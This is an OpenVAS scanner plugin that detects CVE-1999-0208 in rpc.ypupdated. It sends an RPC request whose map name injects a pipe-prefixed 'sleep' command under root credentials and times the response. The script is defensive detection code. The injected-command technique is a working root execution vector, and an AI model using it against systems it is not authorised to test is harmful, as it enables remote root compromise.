# OpenVAS Vulnerability Test
# $Id: ypupdated_remote_exec.nasl 16 2013-10-27 13:09:52Z jan $
# Description: rpc.ypupdated remote execution
#
# Authors:
# Tenable Network Security and Michel Arboi
#
# Copyright:
# Copyright (C) 2008 Tenable Network Security, Inc. and Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "'ypupdated -i' is running on this port.

Description :

ypupdated is part of NIS and allows a client to update NIS maps.

This old command execution vulnerability was discovered in 1995 and 
fixed then. However, it is still possible to run ypupdated in insecure
mode by adding the '-i' option.
Anybody can easily run commands as root on this machine by specifying 
an invalid map name that starts with a pipe character. Exploits 
have been publicly available since the first advisory.";

tag_solution = "Remove the '-i' option.
If this option was not set, the rpc.ypupdated daemon is still vulnerable 
to the old flaw; contact your vendor for a patch.";

if(description)
{
 script_id(80036);
 script_version("$Revision: 16 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2008-10-24 20:15:31 +0200 (Fri, 24 Oct 2008)");
 script_bugtraq_id(1749, 28383);
 script_cve_id("CVE-1999-0208");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");
 script_name("rpc.ypupdated remote execution");
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 script_summary( "Run shell script through rpc.ypupdated");
 script_category(ACT_ATTACK);
 
 script_copyright("This script is Copyright (C) 2008 Tenable Network Security, Inc. and Michel Arboi");
 script_family( "RPC");
 script_dependencies("secpod_rpc_portmap.nasl", "rpcinfo.nasl");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("misc_func.inc");

g_timeout = 15;	# Must be greater than the maximum sleep value
RPC_PROG = 100028;


function test(port, sleeps, udp)
{
 local_var soc, mapname, packet, tictac1, tictac2, d, data, credentials, sleep;

 foreach sleep (sleeps)
 {
  if(!udp)
  {
   soc = open_sock_tcp (port);
   if (!soc) return 0;
  }
  else
  {
   soc = open_sock_udp (port);
   if (!soc) return 0;
  }

  credentials = xdr_auth_unix(hostname: 'localhost', uid: 0, gid: 0);

  mapname = strcat("|sleep ", sleep, "; true > /dev/null;");

  data = 
        xdr_string(mapname)  +
        xdr_long(2)          +
        xdr_long(0x78000000) +
        xdr_long(2)          +
        xdr_long(0x78000000) ;

  packet = rpc_packet (prog:RPC_PROG, vers:1, proc:0x01, credentials:credentials, data:data, udp:udp);

  tictac1 = unixtime();

  data = rpc_sendrecv (socket:soc, packet:packet, udp:udp, timeout:g_timeout);
  close(soc);

  tictac2 = unixtime();
  d = tictac2 - tictac1;

  if ( isnull(data) || (d < sleep) || (d >= (sleep + 5)) )
    return 0;
 }

 return 1;
}


function check_flaw(ports, udp)
{
 local_var port;

 foreach port(ports)
 {
  if (test(port: port, sleeps: make_list(1, 3, 7), udp: udp))
    security_hole(port: port);
 }
}

tcp_ports = get_kb_list('Services/RPC/ypupdated');
if (isnull(tcp_ports))
{
 port = get_rpc_port(program: RPC_PROG, protocol: IPPROTO_TCP);
 if (port) tcp_ports = make_list(port);
}

check_flaw(ports:tcp_ports, udp:0);

  
udp_ports = get_kb_list('Services/udp/RPC/ypupdated');
if (isnull(udp_ports))
{
 port = get_rpc_port(program: RPC_PROG, protocol: IPPROTO_UDP);
 if (port) udp_ports = make_list(port);
}

check_flaw(ports:udp_ports, udp:1);
